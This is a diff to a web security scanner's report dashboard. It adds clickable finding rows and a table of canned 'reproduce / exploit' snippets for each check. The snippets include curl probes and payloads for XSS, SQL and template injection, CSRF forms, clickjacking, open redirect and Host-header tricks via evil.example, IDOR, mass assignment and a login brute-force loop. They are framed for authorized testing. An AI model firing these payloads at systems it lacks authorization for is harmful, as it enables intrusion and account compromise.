@@ -388,6 +388,15 @@ th{color:var(--mut);font-weight:600;font-size:10px;letter-spacing:.12em;text-tra
 .s-FAIL{color:var(--fail);border-color:var(--fail)}.s-WARN{color:var(--warn);border-color:var(--warn)}
 .s-PASS{color:var(--pass);border-color:var(--pass)}.s-INFO{color:var(--info);border-color:var(--info)}.s-SKIP{color:var(--skip);border-color:var(--skip)}
 .mut{color:var(--mut)}.gold{color:var(--gold2)}.warnc{color:var(--warn)}
+.frow{cursor:pointer}
+.frow:hover{background:rgba(121,180,200,.045)}
+.caret{display:inline-block;color:var(--mut);font-size:10px;margin-right:7px;transition:transform .15s,color .15s}
+.frow.open .caret{transform:rotate(90deg);color:var(--gold2)}
+.frow.open>td{border-bottom:0}
+.exp>td{padding-top:0;background:#0c131a}
+.expbody{border-left:2px solid var(--bronze);padding:2px 14px 12px;margin:2px 0 4px}
+.exphdr{font-family:var(--serif);font-size:10px;letter-spacing:.14em;text-transform:uppercase;color:var(--gold2);margin:10px 0 6px}
+.expbody pre{margin-top:0}
 .ht{position:relative;cursor:help}
 .why{margin-left:7px;color:var(--bronze);font-style:normal;font-weight:400;user-select:none}
 .why:hover,.why:focus{color:var(--gold2);outline:none}
@@ -500,6 +509,56 @@ const STATUS_WHY={
  INFO:"Context, not a problem: inventory, reachable paths, enabled methods. Useful for understanding the attack surface.",
  SKIP:"The check didn't run — not applicable, the needed surface wasn't reachable, or it was gated off (passive profile, or CVE lookup disabled)."};
 function statusCell(st){return `<td><span class="pill s-${st} ht" tabindex="0">${st}<span class="tip" data-label="status · ${st}">${esc(STATUS_WHY[st]||'')}</span></span></td>`;}
+// Reproduction / exploit snippets per check — run only against your OWN
+// authorized target. Parameterized with the finding's endpoint + the report
+// target. Keyed by category/check (banner-* and a per-category fallback).
+function _u(r,target){const ep=r.endpoint||'/';const base=(target||'').replace(/\/$/,'');
+ return /^https?:/i.test(ep)?ep:(base+(ep.charAt(0)==='/'?ep:'/'+ep));}
+const EXPLOIT={
+ 'headers/content-security-policy':c=>`# Confirm no CSP is sent:\ncurl -sI "${c.url}" | grep -i content-security-policy    # no output = absent\n\n# With no CSP, any HTML reaching the page unescaped executes, e.g.:\n#   <img src=x onerror=alert(document.domain)>\n# One reflected/stored XSS sink => full script execution + cookie/token theft.`,
+ 'headers/x-content-type-options':c=>`curl -sI "${c.url}" | grep -i x-content-type-options   # absent = sniffable\n\n# A response the browser MIME-sniffs (e.g. an upload served as text/plain)\n# can be interpreted as HTML/JS and run as script.`,
+ 'headers/clickjacking':c=>`# Frame the page from an attacker origin:\ncat > clickjack.html <<'HTML'\n<iframe src="${c.url}" style="opacity:.01;position:fixed;inset:0;width:100%;height:100%"></iframe>\nHTML\n# Open clickjack.html. If the page renders inside the frame, UI-redress\n# (clickjacking) is possible — overlay a fake button over a real control.`,
+ 'headers/hsts':c=>`curl -sI "${c.url}" | grep -i strict-transport-security   # absent = no HSTS\n\n# On-path attacker downgrades the first request to HTTP and strips TLS\n# (e.g. sslstrip), then reads the session cookie in cleartext.`,
+ 'headers/tls':c=>`# Traffic is plain HTTP — capture it on the same network:\ncurl -v "${c.url}"            # request + response travel in cleartext\n# On shared Wi-Fi: tcpdump / mitmproxy reads the session cookie and CSRF token.`,
+ 'headers/banner':c=>`curl -sI "${c.url}" | grep -iE 'server|x-powered-by'   # product + version\n\n# Map the exact version to known CVEs:\n#   searchsploit <product> <version>   (or the vendor's advisories)`,
+ 'csrf/csrf':c=>`# Attacker page auto-submits a cross-site POST using the victim's cookies:\n# <form action="${c.target}/transfer" method="POST">\n#   <input name="amount" value="1000"><input name="to" value="attacker">\n# </form><script>document.forms[0].submit()<\/script>\n# Succeeds without an authenticity_token field => the action is forgeable.`,
+ 'injection/sqli':c=>`# Boolean / error differential on a parameter:\ncurl -s "${c.url}?id=1'"               # DB error / 500 ?\ncurl -s "${c.url}?id=1%20OR%201=1"     # more rows than id=1 ?\n# A consistent differential confirms injection. Fix: parameterized queries.`,
+ 'injection/ssti':c=>`# Inject a template expression into a reflected field:\ncurl -s "${c.url}?q=%3C%25%3D7*7%25%3E"   # sends <%= 7*7 %>\n# If '49' appears in the response, the template engine evaluated your input\n# (server-side => often RCE).`,
+ 'injection/open-redirect':c=>`curl -si "${c.url}?redirect_to=https://evil.example" | grep -i '^location:'\n# If Location points to evil.example, the redirect target isn't allow-listed\n# — usable for phishing and OAuth redirect bypass.`,
+ 'injection/host-header':c=>`curl -s "${c.target}/password_resets" -H "Host: evil.example" | grep -i evil.example\n# If the reset link / absolute URL comes back using evil.example, the app\n# trusts the Host header (poisons reset links, cache keys).`,
+ 'xss/reflected-xss':c=>`curl -s "${c.url}?q=<svg/onload=alert(1)>" | grep -o '<svg/onload=alert(1)>'\n# If the payload is reflected unescaped in an HTML context, it executes in\n# the victim's browser (session/token theft).`,
+ 'xss/stored-xss':c=>`# Submit a payload where it will be shown to other users, then view that page:\ncurl -s -X POST "${c.target}/comments" -d 'body=<svg/onload=alert(document.domain)>'\n# If it runs when another user loads the page, it's stored XSS (hits everyone).`,
+ 'errors/verbose-errors':c=>`curl -s "${c.url}"\n# Returns the Rails exception page + backtrace. Harvest from it: source paths,\n# gem versions, SQL and sometimes secrets — a map for the next attack.`,
+ 'errors/exposed-path':c=>`curl -s "${c.url}" | head -40\n# The sensitive path responds with real content. /rails/info/* leaks the full\n# route map, DB/config and gem list; block it at the web/app layer.`,
+ 'auth/user-enum':c=>`# Known vs. random email give different signup responses:\ncurl -s -X POST "${c.target}/users" -d 'user[email]=known@example.com&user[password]=Passw0rd!1' | grep -i 'taken\\|exists'\n# A distinguishable response/status lets an attacker enumerate real accounts.`,
+ 'auth/rate-limit':c=>`# Hammer login with wrong passwords; watch for a 429 / lockout:\nfor i in $(seq 1 50); do curl -s -o /dev/null -w "%{http_code}\\n" \\\n  -X POST "${c.target}/login" -d 'email=a@b.c&password=wrong'; done | sort | uniq -c\n# All 200/302 and no lockout => brute-force / credential-stuffing is viable.`,
+ 'auth/session-fixation':c=>`# Note the session id before login, then after:\ncurl -s -i "${c.target}/login" | grep -i set-cookie      # pre-auth session id\n# Log in reusing that same cookie; if the id is unchanged after auth, an\n# attacker who planted it can ride the authenticated session.`,
+ 'auth/logout':c=>`# Capture a session cookie, log out, then replay it:\ncurl -s -b "_session=<captured>" "${c.target}/account"   # still 200 after logout?\n# If the old cookie still works, logout didn't invalidate the server session.`,
+ 'access-control/idor':c=>`# As user A, request an object owned by user B by changing the id:\ncurl -s -b "_session=<A's cookie>" "${c.target}/reports/<id-owned-by-B>"\n# If you get B's data (not 404/403), the id isn't scoped to current_user.`,
+ 'access-control/idor-read':c=>`curl -s -b "_session=<A's cookie>" "${c.target}/reports/<id-owned-by-B>"\n# Returns B's record => read IDOR. Scope every lookup to current_user.`,
+ 'access-control/idor-write':c=>`curl -s -b "_session=<A's cookie>" -X PATCH "${c.target}/reports/<id-owned-by-B>" -d 'title=owned'\n# Mutates B's record => write IDOR. Enforce object-level authorization.`,
+ 'access-control/privesc':c=>`# Hit an admin-only route as a normal (or anonymous) user:\ncurl -s -b "_session=<non-admin>" -o /dev/null -w "%{http_code}\\n" "${c.target}/admin"\n# 200 instead of 403/redirect => privilege escalation.`,
+ 'access-control/format-bypass':c=>`curl -s -o /dev/null -w "%{http_code}\\n" "${c.url}"        # HTML route (gated?)\ncurl -s -o /dev/null -w "%{http_code}\\n" "${c.url}.json"   # same route, .json\n# If .json returns 200 where HTML was blocked, the guard only covered one format.`,
+ 'mass-assignment/mass-assign':c=>`# Add an unexpected attribute to a normal update:\ncurl -s -b "_session=<you>" -X PATCH "${c.target}/account" -d 'user[email]=you@x.c&user[admin]=true'\n# If the extra field sticks (admin/role/owner_id), params aren't allow-listed.`,
+ 'file-upload/file-upload':c=>`# Upload a script with a benign content-type and fetch it back:\ncurl -s -F 'file=@shell.html;type=image/png' "${c.target}/uploads"\n# If it's stored and served so the browser runs it, validation is missing\n# (check magic bytes, not just the extension/type).`,
+ 'methods/trace':c=>`curl -s -X TRACE "${c.url}" -H "X-Probe: 1"\n# If the request is echoed back, TRACE is enabled (Cross-Site Tracing) —\n# disable it; it has no production use.`,
+ 'cookies/cookie-flags':c=>`curl -sI "${c.url}" | grep -i set-cookie\n# Look for missing HttpOnly / Secure / SameSite on the session cookie:\n#   HttpOnly missing => stealable via XSS; Secure missing => sent over HTTP.`,
+ 'cors/cors':c=>`curl -s -I "${c.url}" -H "Origin: https://evil.example" | grep -i access-control-allow\n# Allow-Origin reflecting evil.example (esp. with Allow-Credentials: true)\n# lets any site read authenticated responses for your logged-in users.`,
+};
+const EXPLOIT_CAT={
+ 'headers':c=>`curl -sI "${c.url}"\n# Inspect the response headers above; the missing one removes a layer of\n# defense — see the "why it matters" note for the concrete attack.`,
+ 'access-control':c=>`# Authenticate as a low-privilege user, then request the resource/action\n# and compare with what that user should see:\ncurl -s -b "_session=<low-priv>" "${c.url}"`,
+ 'injection':c=>`# Send a crafted value into the parameter and look for a differential\n# (error, timing, reflected marker) that proves the input changed the command:\ncurl -s "${c.url}"`,
+};
+function exploitText(r,target){const c={url:_u(r,target),target:(target||'').replace(/\/$/,''),endpoint:r.endpoint||'/'};
+ const k=(r.category||'')+'/'+(r.check||'');let f=EXPLOIT[k];
+ if(!f&&(r.check||'').indexOf('banner-')===0)f=EXPLOIT['headers/banner'];
+ if(!f)f=EXPLOIT_CAT[r.category];
+ try{return f?f(c):null;}catch(e){return null;}}
+function exploitBlock(r,target){const dep=(r.category==='dependencies'&&r.check==='dependency-cve');
+ const t=exploitText(r,target);
+ if(!t&&!dep)return `<div class="expbody"><div class="mut">No canned exploit for this check — reproduce against the endpoint above and confirm with the fix note.</div></div>`;
+ return `<div class="expbody">${dep?'<div class="note gold">▶ Use the ⚙ Generate PoC button for a live, runnable exploit harness.</div>':''}${t?`<div class="exphdr">Reproduce / exploit &middot; run only against your own authorized target</div><pre>${esc(t)}</pre>`:''}</div>`;}
 const TOKEN=new URLSearchParams(location.search).get('token')||'';
 async function j(u,o){o=o||{};o.headers=Object.assign({'X-Prodscan-Token':TOKEN},o.headers||{});const r=await fetch(u,o);return r.json();}
 async function loadConfigs(){const c=await j('/api/configs');$('#cfg').innerHTML=c.map(x=>`<option>${esc(x)}</option>`).join('')||'<option>(no configs)</option>';}
@@ -510,7 +569,7 @@ async function showReport(name){const d=await j('/api/report?name='+encodeURICom
   const s=d.summary||{}; const order={FAIL:0,WARN:1,PASS:2,INFO:3,SKIP:4};
   const res=(d.results||[]).slice().sort((a,b)=>(order[a.status]??9)-(order[b.status]??9));
   const kpi=['FAIL','WARN','PASS','INFO','SKIP'].map(k=>`<div class="kpi"><b class="s-${k}">${s[k]||0}</b><span>${k}</span></div>`).join('');
-  const rows=res.filter(r=>r.status!=='PASS'&&r.status!=='INFO'&&r.status!=='SKIP').map(r=>{const oi=(d.results||[]).indexOf(r);const pb=(r.category==='dependencies'&&r.check==='dependency-cve')?`<div><button class="mini genpoc" data-rep="${esc(name)}" data-idx="${oi}">⚙ Generate PoC</button></div>`:'';return `<tr>${statusCell(r.status)}<td>${esc(r.severity)}</td><td class="mut">${esc(r.category)}/${esc(r.check)}</td><td><b>${esc(r.title)}</b>${whyTip(r)}${r.endpoint?`<div class="mut">${esc(r.endpoint)}</div>`:''}<div class="ev">${esc(r.detail)}</div>${r.remediation?`<div class="mut">fix: ${esc(r.remediation)}</div>`:''}${pb}</td></tr>`;}).join('');
+  const rows=res.filter(r=>r.status!=='PASS'&&r.status!=='INFO'&&r.status!=='SKIP').map(r=>{const oi=(d.results||[]).indexOf(r);const pb=(r.category==='dependencies'&&r.check==='dependency-cve')?`<div><button class="mini genpoc" data-rep="${esc(name)}" data-idx="${oi}">⚙ Generate PoC</button></div>`:'';return `<tr class="frow">${statusCell(r.status)}<td>${esc(r.severity)}</td><td class="mut">${esc(r.category)}/${esc(r.check)}</td><td><span class="caret">&#9656;</span><b>${esc(r.title)}</b>${whyTip(r)}${r.endpoint?`<div class="mut">${esc(r.endpoint)}</div>`:''}<div class="ev">${esc(r.detail)}</div>${r.remediation?`<div class="mut">fix: ${esc(r.remediation)}</div>`:''}${pb}</td></tr><tr class="exp" hidden><td colspan="4">${exploitBlock(r,d.target)}</td></tr>`;}).join('');
   const passed=res.filter(r=>['PASS','INFO','SKIP'].includes(r.status)).map(r=>`<tr>${statusCell(r.status)}<td class="mut">${esc(r.category)}/${esc(r.check)}</td><td>${esc(r.title)}${whyTip(r)}</td></tr>`).join('');
   $('#main').innerHTML=`<h2>${esc(d.target)} <span class="badge v-${esc(d.verdict)}">${esc(d.verdict)}</span></h2>
     <div class="row">${kpi}</div>
@@ -518,6 +577,10 @@ async function showReport(name){const d=await j('/api/report?name='+encodeURICom
     <div class="card"><b>Passed / informational</b><table>${passed}</table></div>
     ${(d.notes&&d.notes.length)?`<div class="card"><b>Recon notes</b><pre>${esc(d.notes.join('\n'))}</pre></div>`:''}
     <div id="pocarea"></div>`;
+  document.querySelectorAll('.frow').forEach(row=>{row.onclick=e=>{
+    if(e.target.closest('button,a,.why'))return;          // don't toggle on controls
+    const ex=row.nextElementSibling;
+    if(ex&&ex.classList.contains('exp')){ex.hidden=!ex.hidden;row.classList.toggle('open',!ex.hidden);}};});
   document.querySelectorAll('.genpoc').forEach(b=>b.onclick=async()=>{b.disabled=true;const t=b.textContent;b.textContent='generating…';
     const r=await j('/api/genpoc',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({report:b.dataset.rep,idx:+b.dataset.idx})});
     b.disabled=false;b.textContent=t;showPoc(r.error?null:r,r.error);});}
